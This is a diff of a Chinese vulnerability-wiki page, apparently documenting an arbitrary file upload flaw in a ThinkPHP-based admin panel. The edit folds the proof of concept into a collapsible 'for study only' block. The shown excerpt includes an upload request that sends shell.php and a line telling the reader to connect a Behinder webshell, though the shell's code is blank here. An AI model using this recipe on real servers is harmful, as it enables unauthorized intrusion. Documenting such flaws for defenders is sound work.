@@ -41,8 +41,10 @@ http://xxx.xxx.xxx.xxx/admin.php/index/login.html
 
 ```plain
 thinkphp/library/think/File.php
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170922307.png)
 
 任意找一处文件上传点
@@ -81,12 +83,13 @@ C:\fakepath\shell.php
 Content-Disposition: form-data; name="imgFile"; filename="shell.php"
 Content-Type: application/octet-stream
 
-<?php
+&lt;?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
-?>
+?&gt;
 
-------WebKitFormBoundaryYIt9WaQZiDMrwAVm--
-```
+------WebKitFormBoundaryYIt9WaQZiDMrwAVm--</code></pre>
+
+</details>
 
 连接冰蝎木马即可
 
